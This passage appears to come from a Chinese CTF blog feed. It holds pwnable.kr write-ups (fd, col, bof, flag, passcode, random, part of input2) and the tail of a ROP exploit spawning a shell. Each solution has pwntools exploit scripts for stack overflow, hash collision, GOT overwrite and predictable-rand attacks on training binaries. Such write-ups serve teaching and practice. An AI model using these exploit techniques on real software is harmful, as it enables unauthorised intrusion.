    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>binsh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>ret<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ç¬”è®°</category>
        <category>æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>åç‰¢</tag>
        <tag>äºŒè¿›åˆ¶</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kråšé¢˜ç¬”è®°ï¼ˆä¸€ï¼‰</title>
    <url>/2024/08/12/pwnable-kr%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p><strong>ç›®å½•</strong></p>
<p><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98-fd">ç¬¬ä¸€é¢˜-fd</a></p>
<p><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-col">ç¬¬äºŒé¢˜-col</a></p>
<p><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98-bof">ç¬¬ä¸‰é¢˜-bof</a></p>
<p><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98-flag">ç¬¬å››é¢˜-flag</a></p>
<p><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98-passcode">ç¬¬äº”é¢˜-passcode</a></p>
<p><a href="#%E7%AC%AC%E5%85%AD%E9%A2%98-random">ç¬¬å…­é¢˜-random</a></p>
<p><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98-input2">ç¬¬ä¸ƒé¢˜-input2</a></p>
<p><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98-leg">ç¬¬å…«é¢˜-leg</a></p>
<p><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98-mistake">ç¬¬ä¹é¢˜-mistake</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98-shellshock">ç¬¬åé¢˜-shellshock</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98-coin1">ç¬¬åä¸€é¢˜-coin1</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A2%98-blackjack">ç¬¬åäºŒé¢˜-blackjack</a></p>
<p>[ ç¬¬åä¸‰é¢˜-lotto](# ç¬¬åä¸‰é¢˜-lotto)</p>
<hr>
<h5 id="ç¬¬ä¸€é¢˜-fd"><a href="#ç¬¬ä¸€é¢˜-fd" class="headerlink" title="ç¬¬ä¸€é¢˜-fd"></a>ç¬¬ä¸€é¢˜-fd</h5><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>å¾ˆç®€å•çš„é¢˜ç›®ï¼Œæ ¹æ®æºç å¯ä»¥çŸ¥é“fd&#x3D;0ï¼Œå°±å¯ä»¥è¾“å…¥bufçš„å€¼ã€‚ç„¶åå†è¾“å…¥LETMEWIN\nä¾¿å¯ä»¥getflagã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/isDPLCwoTe48OAB.png" alt="83648d3fd6384fb88615354345143865.png"></p>
<p>åé¢åŠ çš„4660ä¹Ÿå°±æ˜¯0x1234ã€‚ç›´æ¥ä¼ å…¥å‚æ•°å°±å®Œäº‹äº†ã€‚</p>
<h5 id="ç¬¬äºŒé¢˜-col"><a href="#ç¬¬äºŒé¢˜-col" class="headerlink" title="ç¬¬äºŒé¢˜-col"></a>ç¬¬äºŒé¢˜-col</h5><p>æŸ¥çœ‹æºç </p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
unsigned <span class="token class-name"><span class="token keyword">long</span></span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span>
unsigned <span class="token return-type class-name"><span class="token keyword">long</span></span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> i<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                res <span class="token operator">+=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>å¯ä»¥çœ‹åˆ°å…³é”®å°±åœ¨äº</p>
<p><img src="https://s2.loli.net/2024/08/19/gKUjRw3q7arYl2N.png" alt="cb2da2235ddf4e5a9177f98485d6b1ef.png"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹check_passwordå‡½æ•°å°±å¯ä»¥çŸ¥é“ï¼Œå…¶å®å°±æ˜¯é‚£äº”ä¸ªæ•°æƒ³åŠ ç­‰äº0x21DD09ECã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/WbAUTRMVkhvqGJ9.png" alt="2ef31af7e9b64a0d88f7127e84cb3265.png"></p>
<p>ä½†éœ€è¦è€ƒè™‘ï¼Œå€¼ä¸èƒ½è¶…è¿‡20ä¸ªå­—ç¬¦å•¥çš„ã€‚ä¹Ÿå¾ˆç®€å•ï¼Œç»™ä»–é™¤ä»¥5é™¤ä¸å°½ã€‚å‰©ä¸‹çš„åˆ†ä¸€ä¸‹å°±è¡Œã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x6c5cec8</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c5cecc</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> io<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">'./col'</span><span class="token punctuation">,</span> argv<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'col'</span><span class="token punctuation">,</span>pl<span class="token punctuation">]</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"FLag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/3dRYWCZe28mvbAt.png" alt="359e2df755334f9bbaddb212cdd6c455.png"></p>
<h5 id="ç¬¬ä¸‰é¢˜-bof"><a href="#ç¬¬ä¸‰é¢˜-bof" class="headerlink" title="ç¬¬ä¸‰é¢˜-bof"></a>ç¬¬ä¸‰é¢˜-bof</h5><p>è¿™é¢˜æ‰ç®—ï¼ˆä¸ªäººè®¤ä¸ºï¼‰pwné¢˜å§ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/5tGJDdARaiqYQcB.png" alt="1beb011fd8b641138ae60567f683d1b8.png"></p>
<p>ä¸‹è½½é™„ä»¶ï¼ŒæŸ¥çœ‹å¾ˆç®€å•ã€‚ä¸€çœ‹å°±æ˜¯æ ˆæº¢å‡ºã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/HXj5rK4OzeS6UPm.png" alt="2f314d69943d44d9a1f5e804c460f358.png"></p>
<p>åŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œoffsetæ˜¯å¤šå°‘å§ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®æ˜¯åœ¨è¿™é‡Œçš„ï¼Œ0xffffcfc0</p>
<p><img src="https://s2.loli.net/2024/08/19/hWY34KanDViP9Ue.png" alt="9a1273b66e7d494896a8b9682650743b.png"></p>
<p>å¯ä»¥çœ‹åˆ°overflowmeæ˜¯ä»0xffffcf8cå¼€å§‹çš„ã€‚æ‰€ä»¥å¯ä»¥å¾—åˆ°offset&#x3D;0x34</p>
<p><img src="https://s2.loli.net/2024/08/19/sxJAaOK4Ck1ygcF.png" alt="ea556c8726294a509627aa908398b94d.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/yd1EoBMsJXTmeSN.png" alt="5d25c24e045f4a06b4c8fe1ada29544d.png"></p>
<h5 id="ç¬¬å››é¢˜-flag"><a href="#ç¬¬å››é¢˜-flag" class="headerlink" title="ç¬¬å››é¢˜-flag"></a>ç¬¬å››é¢˜-flag</h5><p>ä»–è‡ªå·±éƒ½è¯´æ˜¯é€†å‘é¢˜ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/iOEhHsZGjzyn5Yc.png" alt="bf7aacc5ccf940e6a71dd8f7638faa0b.png"></p>
<p>ç›´æ¥æŸ¥å£³ï¼Œå‘ç°æ˜¯upxã€‚ç›´æ¥è„±å£³</p>
<p><img src="https://s2.loli.net/2024/08/19/YeI1uxrAz9mq2gj.png" alt="8ffaf447d6db43619c0ac134338cd6b1.png"></p>
<p>å†æ”¾è¿›idaé‡Œé¢æŸ¥çœ‹å­—ç¬¦è¡¨ï¼Œç›´æ¥æ‰¾åˆ°flag</p>
<p><img src="https://s2.loli.net/2024/08/19/GuamLliMN1eFbXs.png" alt="11a5595bab7d4cfea915b0b3604880ea.png"></p>
<h5 id="ç¬¬äº”é¢˜-passcode"><a href="#ç¬¬äº”é¢˜-passcode" class="headerlink" title="ç¬¬äº”é¢˜-passcode"></a>ç¬¬äº”é¢˜-passcode</h5><p>ç›´æ¥æ”¾è¿›idaé‡Œé¢ï¼Œå‘ç°æ¼æ´ã€‚è¿™ä¸ªä¸¤ä¸ªåº”è¯¥ä½¿ç”¨çš„æ˜¯åœ°å€è€Œä¸æ˜¯å˜é‡ï¼Œç±»ä¼¼äºfmtã€‚æ‰€ä»¥æƒ³ç€è¦†ç›–å§ã€‚å‰é¢è¾“å…¥äº†ä¸€æ¬¡nameï¼Œå¯ä»¥æº¢å‡º</p>
<p><img src="https://s2.loli.net/2024/08/19/IwGVJaFrHug4Z1q.png" alt="293990855fe749eca3462bb172e66b08.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/w1fqcxjIt5Meb2Q.png" alt="aec6d96651944a22a4232176709a3148.png"></p>
<p>é€šè¿‡åŠ¨æ€è°ƒè¯•å¯ä»¥çœ‹åˆ°</p>
<p><img src="https://s2.loli.net/2024/08/19/PjtXU3HzvQD1lpZ.png" alt="f697be6f80284d2d852d4985c084f3d9.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/jwzVZySel6KFWOb.png" alt="f8f8b0dc992e417fa6d2f43bbb0314f8.png"></p>
<p>å‘ç°nameå’Œv1çš„offset&#x3D;0x60ã€‚æ£€æŸ¥ä¿æŠ¤ï¼Œå¯ä»¥æ”¹gotè¡¨</p>
<p><img src="https://s2.loli.net/2024/08/19/LBwdu45JltjFXMI.png" alt="5fb7020aa5ea4521ac5e921877bba7a3.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸çš„ç›´æ¥æŠŠprintfgotè¡¨æ”¹æ‰å°±è¡Œäº†ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/xh6wRdY2zEKcpNL.png" alt="d4212d26f99241318e370d9f980a68c0.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">96</span><span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804A000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    hack <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x80485e3</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>hack<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># io.close()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h5 id="ç¬¬å…­é¢˜-random"><a href="#ç¬¬å…­é¢˜-random" class="headerlink" title="ç¬¬å…­é¢˜-random"></a>ç¬¬å…­é¢˜-random</h5><p>éšæœºæ•°ï¼Œè¿™ä¸ªæ²¡ç»™ç§å­ï¼Œä½†é»˜è®¤æ˜¯0æˆ–è€…1ï¼Œç›´æ¥gdbè°ƒè¯•çœ‹çœ‹ç¬¬ä¸€æ¬¡å€¼æ˜¯å¤šå°‘å°±å¥½å•¦</p>
<p><img src="https://s2.loli.net/2024/08/19/VHgJEbBOsex1iPG.png" alt="9441dcb76a9c4ad5998193956e9c38c0.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/1zAo9YicUZNjPDp.png" alt="3fa4e5e27aba46c387451f6d5b5f1b1f.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
    v5 <span class="token operator">=</span> <span class="token number">0x6b8b4567</span>
    v4 <span class="token operator">=</span> v5<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    flag <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># io.close()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h5 id="ç¬¬ä¸ƒé¢˜-input2"><a href="#ç¬¬ä¸ƒé¢˜-input2" class="headerlink" title="ç¬¬ä¸ƒé¢˜-input2"></a>ç¬¬ä¸ƒé¢˜-input2</h5><p>è¿™é¢˜æ„Ÿè§‰å°±æ˜¯è¿‡æ»¤+ç½‘ç»œç¼–ç¨‹ï¼Œåªèƒ½è¯´æœ‰ç‚¹éš¾åº¦ï¼Œç½‘ä¸Šå¾ˆå¤šè§£é‡Šæˆ‘è¿™é‡Œä¸å¤šè¯´</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token preprocessor property">#include &lt;sys/socket.h></span>
<span class="token preprocessor property">#include &lt;arpa/inet.h></span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// argv</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

  <span class="token comment">// stdio</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
